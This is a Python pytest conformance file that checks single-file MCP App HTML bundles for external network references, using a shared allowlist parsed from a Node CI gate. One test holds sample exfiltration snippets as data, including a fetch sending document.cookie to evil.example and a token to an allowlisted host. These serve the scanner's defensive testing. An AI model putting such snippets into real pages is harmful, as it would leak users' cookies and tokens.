"""Layer 3: Single-file bundle check — AD-11 / NFR4.

WHAT THE RATIFIED TEXT FORBIDS, quoted rather than paraphrased.

``ARCHITECTURE-SPINE.md`` §AD-11 (*One self-contained, token-themed MCP App
runtime*, ``[ADOPTED; REFINED 2026-07-29]``):

    the shared Visualization runtime compiles for MCP Apps to one self-contained
    HTML resource **with no external URL imports**; CI fails on any **forbidden**
    ``http(s):`` bundle reference and required fonts are inlined.

``epics.md:89`` (NFR4) states the blunter form — *"CI fails the build on any
external http(s) reference"* — and subordinates itself to AD-11 by explicit
parenthetical (``(AD-11)``). AD-11 is the later ratification (refined
2026-07-29) and the one that distinguishes: *imports* and *forbidden*
references, not every occurrence of the four characters ``http``. What is
forbidden is a **network fetch at render time**; a URL sitting in a minified
comment or a JSON-Schema ``$id`` constant fetches nothing.

WHY THIS FILE PARSES ITS PATTERNS OUT OF ``ui/scripts/bundle-check.mjs``.

There are two implementations of this one gate: the Node one CI runs
(``ui/scripts/bundle-check.mjs``) and this one. They drifted. Story 9.10 (AC6)
extended the Node allowlist for the bundled ``@modelcontextprotocol/ext-apps``
SDK's inert literals — each with a written justification in that file — and this
copy was never updated, so the **same bytes** produced ``PASSED`` from the Node
gate and ``FAILED`` here (measured 2026-07-31 on
``ui/widgets/google-analytics/dist/index.html``: exit 0 vs. 10 failures). Two
gates that disagree on one artifact are not two gates; they are one gate and one
false alarm, and nobody can tell which is which.

So this layer does not keep a second list. It **reads the Node gate's** list at
import time and fails loudly if it cannot. Adding an exception stays a single,
reviewable edit to ``bundle-check.mjs`` with its justification comment, exactly
as that file requires.

RESOLVING ``widget_ref`` — why a missing ``ui/widgets/<module>/dist`` is NOT a
"widget not built".

All 26 non-context connectors declare the same ``widget_ref``:
``ui://core/daily-report`` — a **core-scoped** resource
(``grep -h '"widget_ref"' server/modules/*/manifest.json | sort -u``). Story 50.5
AC16(c) *deleted* the connector scan that used to resolve that ref to
``ui/widgets/<connector>/dist/index.html``, because whichever connector loaded
first then decided how the standard report looked (see
``server/core/visualization_runtime_resource.py``). Deriving a per-connector path
from a core-scoped ref therefore applies a rule the product removed: it invented
25 artifacts that were never meant to exist, skipped on all 25 with the message
*"run pnpm build for this widget"* — advice for a build that has no target — and
proved AD-11 for none of them.

The bytes a host actually renders for those 26 connectors are ONE core-owned
bundle: the shared Visualization runtime
(``ui://core/visualization-runtime`` → ``ui/cards/shell/dist/viz/mcp-app.html``,
attached by Story 50.6 in ``core/analyze_render_mcp.py``). This layer resolves
core-scoped refs to that path — through ``core.visualization_runtime_resource``
so the constant is never retyped — and scans it. One artifact proves the class of
26, which is the point: 26 skips prove nothing, one scanned bundle proves
everything those 26 declare.

WHAT IS CHECKED HERE
  1. The gate's own patterns loaded from the Node gate (``test_gate_patterns_*``).
  2. The scanner still catches a real exfiltration (``test_guard_catches_*``) —
     including an exfiltration aimed at an *allowlisted host*, which the
     load-bearing-context rule catches regardless of host.
  3. Every module's declared widget, resolved to the artifact really served.
  4. Every built single-file bundle in the repository, not only the declared
     ones (``test_every_built_bundle_is_self_contained``).
  5. CI builds and gates every buildable widget/card package
     (``test_ci_builds_and_gates_every_widget_package``) — an ungated bundle is a
     bundle nobody checks.
"""

from __future__ import annotations

import json
import re
from pathlib import Path

import pytest

pytestmark = pytest.mark.conformance_layer_3

# Root of the repository — resolved from this file's location.
# Layout: server/tests/conformance/test_bundle.py → repo root is ../../../../
_REPO_ROOT = Path(__file__).parent.parent.parent.parent

#: THE gate. Its allowlist is the ratified one (each entry carries its written
#: justification in that file); this module never keeps a second copy.
_NODE_GATE = _REPO_ROOT / "ui" / "scripts" / "bundle-check.mjs"

_CI_WORKFLOW = _REPO_ROOT / ".github" / "workflows" / "ci.yml"


# ---------------------------------------------------------------------------
# Parsing the Node gate's patterns — one source of truth for both gates.
# ---------------------------------------------------------------------------


def _split_js_regex_literal(text: str) -> tuple[str, str]:
    """Split a JS ``/body/flags`` literal, honouring escapes and ``[...]`` classes.

    Naive splitting on ``/`` is wrong here: the allowlist contains both escaped
    slashes (``\\/``) and a raw slash inside a character class (``[-/]``).
    """
    s = text.strip().rstrip(",").strip()
    if not s.startswith("/"):
        raise ValueError(f"not a JS regex literal: {text!r}")
    i, in_class = 1, False
    while i < len(s):
        c = s[i]
        if c == "\\":
            i += 2
            continue
        if in_class:
            if c == "]":
                in_class = False
        elif c == "[":
            in_class = True
        elif c == "/":
            return s[1:i], s[i + 1 :]
        i += 1
    raise ValueError(f"unterminated JS regex literal: {text!r}")


def _js_body_to_python(body: str) -> str:
    """JS regex body → Python. ``\\/`` is a JS-only escape; Python rejects nothing
    else in these patterns (no lookbehind, no named groups, no ``\\d`` semantics
    that differ)."""
    return body.replace("\\/", "/")


def _named_pattern_array(src: str, name: str) -> list[re.Pattern[str]]:
    """Compile the JS regex literals of one named array of the Node gate."""
    block = re.search(rf"const {name}\s*=\s*\[(.*?)\n\];", src, re.S)
    if block is None:  # pragma: no cover - defensive
        raise RuntimeError(f"{name} array not found in {_NODE_GATE}")
    patterns: list[re.Pattern[str]] = []
    for line in block.group(1).splitlines():
        stripped = line.strip()
        if not stripped or stripped.startswith("//"):
            continue
        body, _flags = _split_js_regex_literal(stripped)
        patterns.append(re.compile(_js_body_to_python(body)))
    if not patterns:  # pragma: no cover - defensive
        raise RuntimeError(f"{name} parsed empty from {_NODE_GATE}")
    return patterns


def _load_node_gate() -> tuple[list[re.Pattern[str]], list[re.Pattern[str]], re.Pattern[str]]:
    """Read the gate's two allowlists and LOAD_BEARING_CONTEXT out of ``bundle-check.mjs``.

    Raises rather than degrading. A guard that silently falls back to an empty
    allowlist would go green on everything: the failure mode of a gate must be
    *loud*, never *permissive*.

    THE TWO ARRAYS STAY TWO, and that is why they are read separately.
    ``INERT_PATTERNS`` are literals a self-contained widget may carry --
    namespaces, schema ids, diagnostic links. ``ADMIN_RUNTIME_PATTERNS`` are
    browser destinations the admin console legitimately reaches, "unlike a
    single-file widget", as the Node gate says on the line above them. Folding
    the second into the first would hand every widget bundle three permitted
    hosts, which is the loosening this file exists to refuse. Only the first
    list reaches ``scan_bundle``; the second is read so the integrity test below
    can see that it exists at all.
    """
    if not _NODE_GATE.exists():  # pragma: no cover - repository layout guard
        raise RuntimeError(f"AD-11 gate not found: {_NODE_GATE}")
    src = _NODE_GATE.read_text(encoding="utf-8")

    inert = _named_pattern_array(src, "INERT_PATTERNS")
    admin_runtime = _named_pattern_array(src, "ADMIN_RUNTIME_PATTERNS")

    lb_decl = re.search(r"const LOAD_BEARING_CONTEXT\s*=\s*(/.*?;)\s*\n", src, re.S)
    if lb_decl is None:  # pragma: no cover - defensive
        raise RuntimeError(f"LOAD_BEARING_CONTEXT not found in {_NODE_GATE}")
    lb_body, lb_flags = _split_js_regex_literal(lb_decl.group(1).rstrip(";"))
    load_bearing = re.compile(
        _js_body_to_python(lb_body), re.IGNORECASE if "i" in lb_flags else 0
    )
    return inert, admin_runtime, load_bearing


_INERT_PATTERNS, _ADMIN_RUNTIME_PATTERNS, _LOAD_BEARING_CONTEXT = _load_node_gate()

#: Bare ``http(s)://…`` occurrences anywhere in the bundle.
_ANY_URL = re.compile(r"https?://[^\s\"'`)<>\\]+")


def scan_bundle(content: str) -> list[str]:
    """Return AD-11/NFR4 violations found in a single-file bundle's text.

    Two rules, in this order and for this reason:

    * a URL in a **load-bearing context** (``src=``/``href=``/``url(``/
      ``@import``/``fetch(``/``import(``) is a network fetch by definition and
      fails *whatever the host* — an allowlisted host in a fetch call is an
      exfiltration wearing a permitted name;
    * any other ``http(s)://`` occurrence fails unless it matches an entry of the
      Node gate's justified allowlist.
    """
    failures: list[str] = []

    for ref in _LOAD_BEARING_CONTEXT.findall(content):
        failures.append(f"[bundle] load-bearing external reference: {ref} — violates AD-11/NFR4")

    for url in _ANY_URL.findall(content):
        if not any(pat.match(url) for pat in _INERT_PATTERNS):
            failures.append(f"[bundle] external URL found: {url} — violates AD-11/NFR4")

    for tag in re.findall(r'<link[^>]+href=["\']https?://[^"\']*["\']', content):
        failures.append(f"[bundle] external <link> tag found: {tag} — violates AD-11/NFR4")

    for tag in re.findall(r'<script[^>]+src=["\']https?://[^"\']*["\']', content):
        failures.append(f"[bundle] external <script> tag found: {tag} — violates AD-11/NFR4")

    return failures


# ---------------------------------------------------------------------------
# The gate's own integrity — a guard that cannot measure is not a guard.
# ---------------------------------------------------------------------------


def test_gate_patterns_are_loaded_from_the_node_gate() -> None:
    """This layer and CI share ONE allowlist, read from ``bundle-check.mjs``.

    Pins the parse, so a refactor of that file that this parser stops
    understanding reddens here instead of silently producing an empty (=
    maximally strict) or partial (= maximally permissive after the first
    fallback) list.
    """
    declared = re.findall(
        r"^\s*/\^", _NODE_GATE.read_text(encoding="utf-8"), re.M
    )
    #  EVERY declared literal must land in a list this parser KNOWS, and the
    #  count is taken across both, because that is what catches a THIRD array
    #  appearing. It caught one: `ADMIN_RUNTIME_PATTERNS` was added to the Node
    #  gate on 2026-08-18 and this layer parsed only `INERT_PATTERNS`, so 15 were
    #  read where 18 were declared. The repair is to read the new array and keep
    #  it APART -- never to widen the widget allowlist by three browser hosts.
    parsed = len(_INERT_PATTERNS) + len(_ADMIN_RUNTIME_PATTERNS)
    assert parsed == len(declared), (
        f"parsed {parsed} patterns ({len(_INERT_PATTERNS)} inert + "
        f"{len(_ADMIN_RUNTIME_PATTERNS)} admin-runtime) but {len(declared)} regex "
        f"literals are declared in {_NODE_GATE} — the parser is out of step with the gate"
    )
    #  And the two lists must not have collapsed into one: a widget bundle is
    #  scanned with `_INERT_PATTERNS` alone.
    assert not ({p.pattern for p in _INERT_PATTERNS} & {p.pattern for p in _ADMIN_RUNTIME_PATTERNS})
    assert _LOAD_BEARING_CONTEXT.search('src="https://example.com/a.js"')


def test_guard_catches_a_real_exfiltration() -> None:
    """The allowlist did not open a hole: prove the scanner still fires.

    Each case is a bundle that DOES talk to somebody. Remove ``scan_bundle``'s
    two rules and every one of these goes green — which is exactly what
    "loosening the guard" would look like from the outside.
    """
    cases: list[tuple[str, str]] = [
        (
            "bare fetch",
            '<script>fetch("https://evil.example/collect?d="+document.cookie)</script>',
        ),
        ("dynamic import", '<script>import("https://evil.example/payload.js")</script>'),
        ("external script tag", '<script src="https://evil.example/x.js"></script>'),
        ("external stylesheet", '<link rel="stylesheet" href="https://evil.example/s.css">'),
        ("css @import", "<style>@import 'https://evil.example/f.css';</style>"),
        ("css url()", "<style>body{background:url('https://evil.example/p.png')}</style>"),
        ("bare URL in a string", '<script>var endpoint="https://evil.example/beacon";</script>'),
    ]
    for label, content in cases:
        assert scan_bundle(content), f"exfiltration NOT caught: {label} — {content}"

    # The discriminating case, and the reason the allowlist is safe to have.
    # The host is on the allowlist (json-schema.org draft ids are inert string
    # constants shipped by the bundled SDK) but the CONTEXT is a fetch: the
    # load-bearing rule fires regardless of host. Without that rule an attacker
    # only has to pick an allowlisted hostname.
    laundered = '<script>fetch("https://json-schema.org/draft-07/x?d="+token)</script>'
    failures = scan_bundle(laundered)
    assert failures, "exfiltration through an ALLOWLISTED host was not caught"
    assert any("load-bearing" in f for f in failures), (
        f"caught, but not by the context rule: {failures}"
    )


def test_guard_does_not_fire_on_the_justified_inert_literals() -> None:
    """The four Story 9.10 literals, in a non-load-bearing position, are inert.

    This is the half of the reconciliation that turns 10 false failures green;
    it is only defensible because the test above proves the other half.
    """
    inert_sample = (
        '<svg xmlns="http://www.w3.org/2000/svg"></svg>'
        "<script>"
        '/* see https://rolldown.rs/in-depth/bundling-cjs#require-external-modules */'
        'var A={$schema:"https://json-schema.org/draft/2020-12/schema"};'
        'var B={$schema:"http://json-schema.org/draft-07/schema#"};'
        'var C="https://*.example.com";'
        'function ip(n){return new URL(`http://[${n.value}]`)}'
        "</script>"
    )
    assert scan_bundle(inert_sample) == []


# ---------------------------------------------------------------------------
# Layer 3 proper — every module's declared widget.
# ---------------------------------------------------------------------------


def _core_scoped_artifact(widget_ref: str) -> tuple[Path, str]:
    """Artifact + build command for a ``ui://core/...`` widget ref.

    Core-scoped refs are resolved by core, not by this test: the path comes from
    ``core.visualization_runtime_resource``, so the constant is never retyped and
    a move of the bundle cannot leave this layer pointing at a ghost.
    """
    from core import visualization_runtime_resource as _vr  # noqa: PLC0415

    return (
        _vr.runtime_bundle_path(),
        "pnpm -C ui --filter @toorow/card-shell build",
    )


def test_bundle_artifact(manifest: dict, _layer1_status: list[bool]) -> None:
    """Check the single-file bundle this module's ``widget_ref`` really resolves to.

    Skips for context modules (``module_kind='context'``) and for modules that
    declare no widget. Does NOT invent a per-connector path for a core-scoped
    ref — see the module docstring.
    """
    if not _layer1_status[0]:
        pytest.skip("Layer 1 (manifest) failed — skipping bundle layer")

    if manifest.get("module_kind", "kpi") == "context":
        pytest.skip(
            "[bundle] module_kind='context' — Layer 3 (bundle) is N/A for context modules"
        )

    widget_ref: str | None = manifest.get("widget_ref")
    if not widget_ref:
        pytest.skip("module declares no widget")

    module_name: str = manifest["name"]

    if widget_ref.startswith("ui://core/"):
        artifact_path, build_cmd = _core_scoped_artifact(widget_ref)
        owner = f"core-scoped ref {widget_ref} (shared, not per-connector)"
    else:
        artifact_path = _REPO_ROOT / "ui" / "widgets" / module_name / "dist" / "index.html"
        build_cmd = f"pnpm -C ui --filter @toorow/widget-{module_name} build"
        owner = f"module-scoped ref {widget_ref}"

    if not artifact_path.exists():
        pytest.skip(
            f"[bundle] {owner}: artifact not built at {artifact_path} — run `{build_cmd}`. "
            "CI builds and gates it (job `bundle-check`), which "
            "test_ci_builds_and_gates_every_widget_package pins."
        )

    failures = scan_bundle(artifact_path.read_text(encoding="utf-8", errors="replace"))
    if failures:
        pytest.fail(f"{artifact_path}\n" + "\n".join(failures))


# ---------------------------------------------------------------------------
# Every built bundle — not only the declared ones.
# ---------------------------------------------------------------------------


def _built_bundles() -> list[Path]:
    """Every built single-file HTML under ui/widgets and ui/cards.

    ``ui/admin/dist`` is excluded on purpose: the admin console is application
    code mounted as a page, gated in CI with its own 3 MB budget; AD-11 governs
    the MCP App resources.
    """
    out: list[Path] = []
    for root in (_REPO_ROOT / "ui" / "widgets", _REPO_ROOT / "ui" / "cards"):
        if not root.is_dir():
            continue
        for pkg in sorted(p for p in root.iterdir() if p.is_dir()):
            dist = pkg / "dist"
            if not dist.is_dir():
                continue
            out.extend(sorted(p for p in dist.rglob("*.html") if "node_modules" not in p.parts))
    return out


_BUNDLES = _built_bundles()


@pytest.mark.parametrize(
    "bundle",
    _BUNDLES or [pytest.param(None, id="no-bundle-built")],
    ids=[str(p.relative_to(_REPO_ROOT)).replace("\\", "/") for p in _BUNDLES] or None,
)
def test_every_built_bundle_is_self_contained(bundle: Path | None) -> None:
    """AD-11/NFR4 on every artifact that exists, declared by a manifest or not.

    The per-module layer above only reaches bundles a connector points at. The
    shared runtime, the card templates and the sample widget are reached by
    nobody's ``widget_ref`` and are exactly the artifacts a host renders.
    """
    if bundle is None:
        pytest.skip(
            "no widget/card bundle built in this checkout — run `pnpm -C ui -r build`"
        )
    failures = scan_bundle(bundle.read_text(encoding="utf-8", errors="replace"))
    assert not failures, f"{bundle}\n" + "\n".join(failures)


# ---------------------------------------------------------------------------
# CI coverage — a bundle nobody builds is a bundle nobody checks.
# ---------------------------------------------------------------------------


def _buildable_ui_packages() -> list[tuple[str, str]]:
    """(pnpm package name, repo-relative package dir) for every buildable widget/card."""
    packages: list[tuple[str, str]] = []
    for root in ("widgets", "cards"):
        base = _REPO_ROOT / "ui" / root
        if not base.is_dir():
            continue
        for pkg_json in sorted(base.glob("*/package.json")):
            data = json.loads(pkg_json.read_text(encoding="utf-8"))
            if "build" not in data.get("scripts", {}):
                continue
            packages.append(
                (data["name"], f"ui/{root}/{pkg_json.parent.name}")
            )
    return packages


def _ci_bundle_check_job() -> str:
    text = _CI_WORKFLOW.read_text(encoding="utf-8")
    start = text.index("\n  bundle-check:")
    rest = text[start + 1 :]
    end = re.search(r"^  [A-Za-z][\w-]*:$", rest[1:], re.M)
    return rest if end is None else rest[: end.start() + 1]


@pytest.mark.parametrize("pkg_name,pkg_dir", _buildable_ui_packages())
def test_ci_builds_and_gates_every_widget_package(pkg_name: str, pkg_dir: str) -> None:
    """Every buildable widget/card is BUILT and BUNDLE-CHECKED in CI.

    Measured 2026-07-31, before this test existed: CI's `bundle-check` job built
    8 of the 13 buildable packages. Left out were ``card-shell`` — which emits
    ``dist/viz/mcp-app.html``, the shared Visualization runtime AD-11 names by
    phrase and the artifact 26 connectors actually render — plus
    ``card-attribution``, ``card-dedup``, ``card-mediaplan-pacing`` and
    ``widget-project-capability-impact``. Not building them in CI is why AD-11
    was proved for nothing: a bundle nobody builds is a bundle nobody checks.
    """
    job = _ci_bundle_check_job()
    loop_tokens = [
        tok
        for match in re.findall(r"for pkg in ([^;\n]+); do", job)
        for tok in match.split()
    ]
    haystack = "\n".join([job] + [job.replace("$pkg", tok) for tok in loop_tokens])

    assert re.search(rf"--filter {re.escape(pkg_name)}\b", haystack), (
        f"{pkg_name} is never built in CI job `bundle-check` — its bundle is "
        "never produced, so AD-11/NFR4 is proved for nothing"
    )
    assert re.search(rf"bundle-check\.mjs\s+{re.escape(pkg_dir)}/dist/", haystack), (
        f"{pkg_name} is built in CI but its bundle under {pkg_dir}/dist/ is never "
        "passed to ui/scripts/bundle-check.mjs — built and ungated"
    )
